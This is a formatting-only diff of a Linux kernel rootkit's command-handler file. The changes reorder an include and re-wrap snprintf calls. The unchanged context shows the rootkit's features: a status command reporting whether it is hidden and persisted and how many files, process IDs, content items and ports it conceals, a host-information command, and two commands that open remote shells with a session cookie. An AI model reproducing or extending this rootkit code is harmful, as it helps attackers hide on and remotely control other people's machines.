@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: GPL-2.0
 // execution/commands.c - Command handlers matching protocol.toml.
+#include "rootkit.h"
 #include <linux/fs.h>
 #include <linux/random.h>
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/utsname.h>
-#include "rootkit.h"
 
 // --- Session ---
 
@@ -14,11 +14,12 @@ int cmd_status(struct rk_session *s, const char *arg)
 	char buf[256];
 
 	snprintf(buf, sizeof(buf),
-		 "STATUS hidden=%s persisted=%s files=%d pids=%d content=%d ports=%d",
+		 "STATUS hidden=%s persisted=%s files=%d pids=%d content=%d "
+		 "ports=%d",
 		 rk_is_cloaked() ? "yes" : "no",
-		 rk_is_persisted() ? "yes" : "no",
-		 rk_file_targets.count, rk_pid_targets.count,
-		 rk_content_targets.count, rk_port_targets.count);
+		 rk_is_persisted() ? "yes" : "no", rk_file_targets.count,
+		 rk_pid_targets.count, rk_content_targets.count,
+		 rk_port_targets.count);
 	return rk_send_response(s, buf);
 }
 
@@ -26,9 +27,8 @@ int cmd_info(struct rk_session *s, const char *arg)
 {
 	char buf[256];
 
-	snprintf(buf, sizeof(buf), "INFO %s %s %s",
-		 utsname()->nodename, utsname()->release,
-		 utsname()->machine);
+	snprintf(buf, sizeof(buf), "INFO %s %s %s", utsname()->nodename,
+		 utsname()->release, utsname()->machine);
 	return rk_send_response(s, buf);
 }
 
@@ -294,8 +294,8 @@ int cmd_shell(struct rk_session *s, const char *arg)
 	if (rk_start_shell(port, request_id, cookie))
 		return rk_send_response(s, "ERR 4");
 
-	snprintf(buf, sizeof(buf), "OPEN %08x %016llx",
-		 request_id, (unsigned long long)cookie);
+	snprintf(buf, sizeof(buf), "OPEN %08x %016llx", request_id,
+		 (unsigned long long)cookie);
 	return rk_send_response(s, buf);
 }
 
@@ -319,8 +319,8 @@ int cmd_exec_shell(struct rk_session *s, const char *arg)
 	if (rk_start_exec_shell(port, request_id, cookie))
 		return rk_send_response(s, "ERR 4");
 
-	snprintf(buf, sizeof(buf), "OPEN %08x %016llx",
-		 request_id, (unsigned long long)cookie);
+	snprintf(buf, sizeof(buf), "OPEN %08x %016llx", request_id,
+		 (unsigned long long)cookie);
 	return rk_send_response(s, buf);
 }
 
